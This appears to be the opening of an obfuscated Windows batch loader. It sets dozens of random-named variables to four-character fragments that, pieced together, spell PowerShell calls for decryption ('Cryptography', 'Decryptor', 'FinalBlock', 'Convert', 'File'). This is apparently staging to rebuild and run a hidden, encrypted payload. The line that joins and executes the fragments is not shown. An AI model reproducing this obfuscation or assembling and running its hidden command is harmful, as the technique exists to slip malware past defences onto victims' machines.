@echo off
set "UByQesgYyy=oin "
set "PSKsiSumEC=;$wS"
set "HYvAsCLPKj=.Con"
set "bZlBbfdbXS=form"
set "cXbYEVkzau=XmaK"
set "gyKgbEnMLg=ew-O"
set "bLZDQNgXUj=File"
set "jMXMzEuWrJ=xdj "
set "tynnjcUwOR=jzgq"
set "axVcLwvHSy=gsYZ"
set "vJdzljAsSx=srjG"
set "mnyKlMYOUt=ecry"
set "XfrOfGpVsw=srjG"
set "YARdONvBYV=eVtq"
set "tTxfGMwgJr=tsWi"
set "dUmHqDPRSf=.Com"
set "dYEgbQNlfz= New"
set "CAupKHlEew=Star"
set "AMaFlQTPsh=-1.."
set "ePMfRIIXcs=[Sys"
set "RvtxoMgmXO=msrj"
set "dMVejrStCn=Syst"
set "DquEZuerOI=tion"
set "wMdgOctuOw=Syst"
set "PYtScrxFkU=se()"
set "NlQkxlTjjs= = N"
set "hSPSaaOhsg=yste"
set "BvqTssAash=g = "
set "vGELGxITDb=dj0C"
set "zLzcDqJNEm=jG.I"
set "KhfjwFVLIX=lBlo"
set "vzqDiWuBAA=('%*'"
set "CRvvfWPwJe=-4] "
set "VKOCbKEuRU=eVtq"
set "KkkjcttXBy==');"
set "rzOwruBDvL=grap"
set "MipqvOiyaR=lo, "
set "sfKBnrCGpi=ach "
set "kTzGJeSrZv= [st"
set "zAcgAYQJEw=ewLi"
set "xpgqZwobBT=rt]:"
set "xQBYyjXwYc=();$"
set "fQFgyERCxU=j.En"
set "drEuiCyWUr=();$"
set "EoKUcggjdO=ose("
